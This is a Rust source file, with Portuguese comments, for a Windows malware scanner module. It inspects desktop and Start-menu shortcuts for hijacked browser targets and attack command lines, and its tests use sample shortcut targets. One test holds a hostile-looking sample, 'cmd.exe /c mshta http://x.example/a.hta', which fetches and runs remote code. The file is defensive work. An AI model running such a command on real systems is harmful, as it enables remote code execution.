//! Atalhos adulterados: um malware troca o destino de um atalho (ou acrescenta argumentos) para rodar junto
//! com o programa de verdade, ou faz o atalho do navegador abrir sempre uma página dele (sequestro).
//! Olha a Área de Trabalho (sua e pública) e o menu Iniciar. Os atalhos da pasta Startup já são cobertos
//! pelo scanner de persistência.
//!
//! Só aponta sinais fortes (linha de comando de ataque, ou navegador abrindo um endereço fixo). Um atalho
//! para um programa em AppData é normal (Discord, Teams...), então a localização sozinha não conta.
use std::{env, fs, path::PathBuf, time::Duration};

use crate::classify::classify;
use crate::finding::{Finding, Severity};
use crate::sys;

const SCANNER: &str = "atalhos";
const HIJACK_REASON: &str =
    "Atalho do navegador abre sempre um endereço fixo (sequestro de página inicial)";
const BROWSERS: &[&str] = &[
    "chrome.exe",
    "msedge.exe",
    "firefox.exe",
    "brave.exe",
    "opera.exe",
    "vivaldi.exe",
    "iexplore.exe",
];

/// Avalia "destino argumentos" de um atalho. `None` se parece normal.
pub fn assess(command: &str) -> Option<(Severity, &'static str)> {
    let c = command.trim();
    if c.is_empty() {
        return None;
    }
    // Endereço ou pasta sozinhos são comuns em atalhos (--app=https://...): só um sinal ALTO conta.
    let (severity, reason) = classify(c);
    if severity == Severity::High {
        return Some((severity, reason));
    }
    let lower = c.to_lowercase();
    // O sequestro põe o endereço como PRIMEIRO argumento do navegador. Atalho de aplicativo web traz opções
    // antes (`--app=`, `-new-window`, `-taskbar-tab`), então o endereço nunca vem logo depois do programa.
    let first_arg = BROWSERS
        .iter()
        .filter_map(|b| lower.find(b).map(|i| &lower[i + b.len()..]))
        .map(|rest| rest.trim_start_matches('"').trim_start())
        .find_map(|rest| rest.split_whitespace().next())
        .map(|a| a.trim_matches('"'));
    first_arg
        .is_some_and(|a| a.starts_with("http://") || a.starts_with("https://"))
        .then_some((Severity::Suspicious, HIJACK_REASON))
}
fn roots() -> Vec<PathBuf> {
    let var = |n: &str| env::var_os(n).map(PathBuf::from);
    let mut r = Vec::new();
    r.extend(var("USERPROFILE").map(|p| p.join("Desktop")));
    r.extend(var("PUBLIC").map(|p| p.join("Desktop")));
    r.extend(var("APPDATA").map(|p| p.join(r"Microsoft\Windows\Start Menu\Programs")));
    r.extend(var("ProgramData").map(|p| p.join(r"Microsoft\Windows\Start Menu\Programs")));
    r
}

/// `.lnk` em até dois níveis (o menu Iniciar tem uma pasta por programa).
fn collect(dir: &std::path::Path, depth: u32, out: &mut Vec<String>) {
    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };
    for e in entries.flatten() {
        let Ok(kind) = e.file_type() else { continue };
        let path = e.path();
        if kind.is_dir() && depth > 0 && !path.ends_with("Startup") {
            collect(&path, depth - 1, out);
        } else if kind.is_file()
            && path
                .extension()
                .is_some_and(|x| x.eq_ignore_ascii_case("lnk"))
        {
            out.push(path.display().to_string());
        }
    }
}

pub fn scan() -> Vec<Finding> {
    let mut paths = Vec::new();
    for r in roots() {
        collect(&r, 2, &mut paths);
    }
    if paths.is_empty() {
        return Vec::new();
    }
    let script = "$sh = New-Object -ComObject WScript.Shell; $input | ForEach-Object { \
        if ($_) { $l = $sh.CreateShortcut($_); $_ + \"`t\" + $l.TargetPath + ' ' + $l.Arguments } }";
    let Some(out) = sys::powershell(script, Some(&paths.join("\n")), Duration::from_secs(60))
    else {
        return vec![Finding {
            scanner: SCANNER,
            location: "interno".into(),
            name: "Atalhos NÃO verificados".into(),
            target: String::new(),
            severity: Severity::Info,
            reason: "Não consegui ler os atalhos (PowerShell indisponível); essa parte não foi verificada",
        }];
    };
    parse(&out)
}

fn parse(out: &str) -> Vec<Finding> {
    out.lines()
        .filter_map(|l| l.split_once('\t'))
        .filter_map(|(path, target)| {
            let (severity, reason) = assess(target)?;
            let p = std::path::Path::new(path.trim());
            Some(Finding {
                scanner: SCANNER,
                location: p
                    .parent()
                    .map(|d| d.display().to_string())
                    .unwrap_or_default(),
                name: p
                    .file_name()
                    .map(|n| n.to_string_lossy().into_owned())
                    .unwrap_or_default(),
                target: target.trim().to_string(),
                severity,
                reason,
            })
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn normal_shortcuts_are_left_alone() {
        for c in [
            r"C:\Users\x\AppData\Local\Discord\app-1.0\Discord.exe --processStart Discord.exe",
            r#"C:\Program Files\Google\Chrome\Application\chrome.exe --profile-directory="Default""#,
            r"C:\Program Files\Google\Chrome\Application\chrome.exe --app=https://mail.example.com",
            r#"C:\Program Files\Mozilla Firefox\firefox.exe "-taskbar-tab" "id" "-new-window" "https://app.example/" "-profile" "C:\p""#,
            r"C:\Windows\explorer.exe",
            "",
        ] {
            assert!(assess(c).is_none(), "{c}");
        }
    }

    #[test]
    fn a_browser_shortcut_with_a_bare_url_is_a_hijack() {
        let (sev, reason) =
            assess(r"C:\Program Files\Google\Chrome\Application\chrome.exe http://busca.example/")
                .unwrap();
        assert_eq!((sev, reason), (Severity::Suspicious, HIJACK_REASON));
        assert!(
            assess(r"C:\Program Files\Mozilla Firefox\firefox.exe https://x.example").is_some()
        );
        // Um programa que não é navegador abrindo uma URL não é sequestro.
        assert!(assess(r"C:\Tools\notes.exe https://x.example").is_none());
    }

    #[test]
    fn strong_command_line_signals_in_a_shortcut_are_reported() {
        let (sev, _) = assess("cmd.exe /c mshta http://x.example/a.hta").unwrap();
        assert_eq!(sev, Severity::High);
    }

    #[test]
    fn output_lines_become_findings_with_folder_and_name() {
        let out = "C:\\Users\\x\\Desktop\\Chrome.lnk\tC:\\Program Files\\Google\\Chrome\\Application\\chrome.exe http://busca.example/\n\
                   C:\\Users\\x\\Desktop\\Ok.lnk\tC:\\Windows\\notepad.exe \n";
        let f = parse(out);
        assert_eq!(f.len(), 1);
        assert_eq!((f[0].name.as_str(), f[0].scanner), ("Chrome.lnk", SCANNER));
        assert!(f[0].location.ends_with("Desktop"));
    }

    #[test]
    fn the_real_scan_runs() {
        for f in scan() {
            assert_eq!(f.scanner, SCANNER);
        }
    }
}
